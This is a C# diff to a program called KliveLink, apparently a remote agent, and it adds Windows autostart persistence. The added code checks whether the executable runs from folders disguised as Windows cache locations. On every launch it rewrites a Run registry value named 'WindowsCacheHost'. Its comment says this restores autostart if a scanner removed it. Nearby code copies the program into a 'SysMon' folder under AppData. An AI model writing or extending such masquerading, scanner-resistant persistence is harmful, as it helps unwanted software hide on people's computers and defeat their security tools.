@@ -37,6 +37,8 @@ namespace KliveLink
 
             // Move app to AppData and set auto-start if first launch
             string currentPath = Environment.ProcessPath!;
+            if (alreadyInstalled && IsPersistentInstallPath(currentPath))
+                EnsureRunKey(currentPath);
             string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SysMon");
             string targetPath = Path.Combine(targetDir, Path.GetFileName(currentPath));
             if (!alreadyInstalled && currentPath != targetPath)
@@ -139,6 +141,41 @@ namespace KliveLink
             _client?.Dispose();
             _v2Client?.Dispose();
             _trayIcon?.Dispose();
+        }
+
+        private static bool IsPersistentInstallPath(string path)
+        {
+            try
+            {
+                string full = Path.GetFullPath(path);
+                string programData = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+                    "WindowsCacheHost");
+                string caches = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                    "Microsoft", "Windows", "Caches", "kl");
+                return full.StartsWith(programData + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase) ||
+                       full.StartsWith(caches + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase);
+            }
+            catch { return false; }
+        }
+
+        /// <summary>
+        /// Re-asserts the per-user Run value every time an installed agent starts. This
+        /// repairs autostart if the installer could not write it, or if a scanner removed it.
+        /// </summary>
+        private static void EnsureRunKey(string exePath)
+        {
+            try
+            {
+                using RegistryKey? key = Registry.CurrentUser.CreateSubKey(
+                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                if (key == null) return;
+                string desired = $"\"{exePath}\" --installed";
+                if (key.GetValue("WindowsCacheHost") as string != desired)
+                    key.SetValue("WindowsCacheHost", desired, RegistryValueKind.String);
+            }
+            catch { }
         }
 
         /// <summary>
